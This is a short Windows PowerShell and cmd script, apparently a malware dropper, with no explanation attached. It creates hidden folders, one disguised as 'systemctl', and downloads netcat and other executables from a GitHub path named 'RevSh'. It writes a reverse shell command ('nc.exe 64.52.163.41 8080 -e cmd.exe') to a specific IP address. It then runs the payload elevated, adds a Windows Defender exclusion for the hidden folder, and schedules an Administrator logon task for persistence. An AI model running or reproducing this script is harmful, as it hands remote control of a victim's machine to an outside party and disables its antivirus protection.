cmd /c "md C:\nc systemctl"
cmd /c "attrib +h C:\nc"
cmd /c "attrib +h c:\systemctl"
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/rh.exe","C:\nc\rh.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.exe","C:\nc\nc.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/voice.exe","C:\nc\voice.exe")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/7ext34/7ext-34/master/RevSh/Windows10/nc.bat","C:\nc\nc.bat")
cmd.exe /c md C:\systemctl
cmd.exe /c attrib +h c:\systemctl
echo "nc.exe 64.52.163.41 8080 -e cmd.exe" >> C:\nc\nc_run.bat
cmd.exe /c "powershell -command Start-Process C:\nc\nc.bat -Verb runas & powershell Add-MpPreference -ExclusionPath C:\systemctl & schtasks /create /sc onlogon /tn "systemctl\system tasks" /tr "c:\nc\nc.bat" /ru Administrator /rl highest"
